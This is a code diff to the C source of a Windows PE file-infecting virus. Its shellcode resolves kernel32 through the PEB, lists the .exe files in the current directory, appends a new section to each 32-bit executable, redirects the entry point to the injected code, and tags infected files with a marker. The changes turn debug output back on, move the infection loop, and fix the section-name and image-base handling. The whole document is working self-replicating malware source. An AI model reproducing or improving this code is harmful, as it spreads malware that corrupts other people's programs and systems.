@@ -99,10 +99,10 @@ typedef struct SHELL_CODE_SUPER_BLOCK {
 #include <string.h>
 #endif
 
-// __forceinline void noputs(const char *ptr) { return; } 
-// #ifndef DEBUG
-// #define puts noputs
-// #endif
+__forceinline void noputs(const char *ptr) { return; } 
+#ifndef DEBUG
+#define puts noputs
+#endif
 
 #ifndef DEBUG_STATIC
 #define FindFirstFileA sb->_FindFirstFileA
@@ -240,33 +240,35 @@ __forceinline DWORD FindBase(PWCHAR DemandModuleName, PEB *peb) {
 
 __forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
-        // puts("Error when set file pointor!");
+        puts("Error when set file pointor!");
         return 1;
     }
     if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
-        // puts("Error when read file!");
+        puts("Error when read file!");
         return 2;
     }
     return 0;
 }
+
 __forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
-        // puts("Error when set file pointor!");
+        puts("Error when set file pointor!");
         return 1;
     }
     if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
-        // puts("Error when write file!");
+        puts("Error when write file!");
         return 2;
     }
     return 0;
 }
+
 __forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
     if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
-        // puts("Error when set file pointor!");
+        puts("Error when set file pointor!");
         return 1;
     }
     if(SetEndOfFile(hFile) == FALSE) {
-        // puts("Error when modify size!");
+        puts("Error when modify size!");
         return 2;
     }
     return 0;
@@ -289,7 +291,7 @@ __forceinline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
 __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     int err = 0;
 //----------------------------------------------------------------------
-    // puts("Init header pointers...");
+    puts("Init header pointers...");
     // headers
     /* init in struct SCSB */
     // headers pointer
@@ -299,7 +301,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     PIMAGE_SECTION_HEADER pLasSecHdr = &sb->lasSecHdr;
     PIMAGE_SECTION_HEADER pNewSecHdr = &sb->newSecHdr;
 //----------------------------------------------------------------------
-    // puts("Parse headers...");
+    puts("Parse headers...");
     // Get DOS Header
     err = ReadOffset(
         sb, hFile, 0, FILE_BEGIN, 
@@ -308,7 +310,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     if(err) return -1;
     // Check infected
     if(pDosHdr->e_res[0] == 0x1234) {
-        // puts("Error: Target has been infected!");
+        puts("Error: Target has been infected!");
         return 1;
     }
     // Check Signature
@@ -319,7 +321,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     );
     if(err) return -1;
     if(pe00 != 0x00004550) {
-        // puts("Error: Not a pe file!");
+        puts("Error: Not a pe file!");
         return 2;
     }
     // Get File Header
@@ -337,7 +339,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     );
     if(err) return -1;
     if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
-        // puts("Error: Not a 32 bits exe!");
+        puts("Error: Not a 32 bits exe!");
         return 3;
     }
     // Check Headers Space
@@ -348,7 +350,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
         + pFileHdr->SizeOfOptionalHeader;
     long alignSize = pOptHdr->SizeOfHeaders;
     if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
-        // puts("Error: No space to insert a new sections!");
+        puts("Error: No space to insert a new sections!");
         return 4;
     }
     // Get Last Section Header
@@ -358,7 +360,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     );
     if(err) return -1;
 //----------------------------------------------------------------------
-    // puts("Calc address...");
+    puts("Calc address...");
     // Get align
     long fileAlign = pOptHdr->FileAlignment;
     long secAlign = pOptHdr->SectionAlignment; 
@@ -384,6 +386,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     // Set New Section Header
     char *sName = pNewSecHdr->Name;
     sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
+    sName[3] = sName[4] = sName[5] = sName[6] = sName[7] = 0; /* Something not null when O2*/
     pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
     pNewSecHdr->VirtualAddress = rvaNewSec;
     pNewSecHdr->SizeOfRawData = raw_size;
@@ -402,7 +405,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     pOptHdr->AddressOfEntryPoint = rvaNewSec;
     pOptHdr->SizeOfImage = rvaNewSec + vir_size;
 //----------------------------------------------------------------------
-    // puts("Save changing...");
+    puts("Save changing...");
     // Saved Dos Header
     err = WriteOffset(
         sb, hFile, 0, FILE_BEGIN,
@@ -450,27 +453,6 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
 
 //======================================================================
 
-__forceinline void ShellCodeMain(SCSB *sb) {
-    // find exe in cwd
-    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(search, &findData);
-    if(hFind == INVALID_HANDLE_VALUE) return;
-    // iterate files
-    LPWIN32_FIND_DATAA lpFindData = &findData;
-    do {
-        // puts(lpFindData->cFileName);
-        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
-        if(hf == NULL) continue;
-        InfectTarget(sb, hf);
-        CloseHandle(hf);
-    } while(FindNextFileA(hFind, lpFindData));
-    FindClose(hFind);
-    return;
-}
-
-//======================================================================
-
 __forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
     // Get Module Base
     WCHAR DemandModuleName[13] = {L'K', L'E', L'R', L'N', L'E', L'L',
@@ -502,19 +484,40 @@ __forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
 
 //======================================================================
 
+__forceinline void ShellCodeMain(SCSB *sb) {
+    // find exe in cwd
+    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA(search, &findData);
+    if(hFind == INVALID_HANDLE_VALUE) return;
+    // iterate files
+    LPWIN32_FIND_DATAA lpFindData = &findData;
+    do {
+        puts(lpFindData->cFileName);
+        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
+        if(hf == NULL) continue;
+        InfectTarget(sb, hf);
+        CloseHandle(hf);
+    } while(FindNextFileA(hFind, lpFindData));
+    FindClose(hFind);
+    return;
+}
+
+//======================================================================
+
 void ShellCode() {
 __code_start:
     SCSB super_block;
     SCSB *sb = &super_block;
     PPEB peb;
-    PBYTE imageBase;
+    DWORD imageBase;
     // get peb
     __asm {
         mov eax, fs:[30h];
         mov peb, eax
     }
     // get imageBase
-    imageBase = (PBYTE)*(DWORD*)(peb + 0x8);
+    imageBase = (DWORD)peb->Reserved3[1];
     // Get funtion pointer
     GetAllFunc(peb, sb);
     // Get Code info
@@ -534,6 +537,9 @@ __code_start:
     sb->_shellCode = codeAdr;
     sb->_CODE_SIZE = codeSize;
     sb->_JMP_POINT_OFFSET = jmpPoint;
+#ifdef DEBUG
+    printf("Codeinfo: %p %d %d\n", codeAdr, codeSize, jmpPoint);
+#endif
     // Start infecting
     ShellCodeMain(sb);
     // Return back
